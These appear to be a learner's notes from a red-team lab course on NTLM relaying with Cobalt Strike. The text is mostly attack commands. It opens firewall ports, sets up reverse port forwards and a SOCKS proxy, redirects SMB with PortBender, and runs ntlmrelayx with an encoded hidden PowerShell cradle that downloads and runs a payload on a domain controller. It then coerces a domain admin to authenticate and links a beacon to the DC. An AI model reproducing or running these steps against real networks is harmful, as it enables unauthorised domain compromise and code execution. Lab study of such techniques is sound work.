## NTLM Relaying
### Setup
On WKSTN-2 as System allow ports inbound on firewall
```powershell
beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```
![[Pasted image 20230829154704.png]]
Start two reverse port forwards - 1st for SMB capture, the other for Powershell cradle.
```powershell
beacon> rportfwd 8445 localhost 445
[+] started reverse port forward on 8445 to localhost:445

beacon> rportfwd 8080 localhost 80
[+] started reverse port forward on 8080 to localhost:80
```
![[Pasted image 20230829154734.png]]
Setup socks proxy that ntlmrelayx uses to send responses back to network.
```powershell
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```
Setting up SMB File payload hosting:
TO SET UP SMB FILE HOST GO TO SITE - ON COBALT STRIKE  SITE MANAGEMENT -> HOST FILE -> SPECIFY LOCATION SUCH AS /B ADD A PAYLOAD AND ENSURE IT IS FACING THE TEAM SERVER IP ADDRESS 
![[Pasted image 20230829142817.png]]
![[Pasted image 20230829142841.png]]
![[Pasted image 20230829155759.png]]
### NTLM Relay start
This command was given to us.
```powershell
# use this specific proxychains command on ATTACKER LINUX
attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA='
```
Where:
- 10.10.122.10 is the IP address of `dc-2.dev.cyberbotic.io`, which is our target.
- The encoded command is a download cradle pointing at `http://10.10.123.102:8080/b`, and `/b` is an SMB payload.
![[Pasted image 20230829143031.png]]
Upload WinDivert64.sys to WKS-2 
```bash
# this is all done in the system WKS 2
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
```
![[Pasted image 20230829143308.png]]
ls'ing to ensure that file was uploaded
![[Pasted image 20230829143336.png]]
Then go to _Cobalt Strike > Script Manager_ and load `PortBender.cna` from `C:\Tools\PortBender` - this adds a new `PortBender` command to the console.
![[Pasted image 20230829143427.png]]
![[Pasted image 20230829143448.png]]
Utilize portbender to push traffic from smb port to 8445
`This pretty much breaks any legitimate SMB service on the machine.`
```powershell
beacon> PortBender redirect 445 8445
```
![[Pasted image 20230829153908.png]]
To trigger the attack, we need to coerce a user or a machine to make an authentication attempt to Workstation 2.  Let's do it manually for now, by using the console of Workstation 1 as the user nlamb.  This user is a domain admin, so we can relay the authentication request to the domain controller.
This is done on WKSTN-1
```powershell
C:\Users\nlamb>hostname
C:\Users\nlamb>dir \\10.10.123.102\relayme
```
![[Pasted image 20230829154522.png]]

This didnt work for me.
The fix was to change the /etc/proxychains to port 1080
![[Pasted image 20230830135218.png]]

Shows that the file was grabbed in the web log
![[Pasted image 20230830135351.png]]

beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-55d3272f-cf2f-4958-90dd-18468b6b1337

On as DC02
![[Pasted image 20230830141607.png]]